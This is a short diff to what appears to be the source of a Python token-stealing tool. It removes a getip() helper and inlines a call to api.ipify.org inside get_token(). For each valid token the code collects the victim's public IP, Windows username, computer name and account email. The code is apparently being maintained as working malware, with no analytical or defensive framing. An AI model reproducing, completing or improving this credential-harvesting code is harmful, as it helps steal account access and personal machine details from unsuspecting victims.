@@ -33,12 +33,7 @@ checker = []
 
 
 
-def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except: pass
-    return ip
+
 
 def get_token():
     already_check = []
@@ -106,7 +101,7 @@ def get_token():
                     except: continue
                     if res.status_code == 200:
                         res_json = res.json()
-                        ip = getip()
+                        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
                         pc_username = os.getenv("UserName")
                         pc_name = os.getenv("COMPUTERNAME")
                         email = res_json['email']
